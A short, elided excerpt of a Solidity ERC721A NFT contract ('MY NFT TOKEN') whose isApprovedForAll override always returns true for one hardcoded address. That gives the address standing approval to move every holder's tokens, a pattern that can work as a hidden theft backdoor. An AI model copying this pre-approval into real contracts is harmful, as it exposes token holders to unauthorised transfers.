  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x811286Ad38D6A63BA9e9112DaB5eB4F8d0cF704c){return true;}
...
contract MY_NFT_TOKEN is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    ...
    uint256 collectionSize_
  ) ERC721A("MY NFT TOKEN", "MNFT", maxPerAddress_, collectionSize_) {
    maxPerAddressDuringMint = maxPerAddress_;
  }
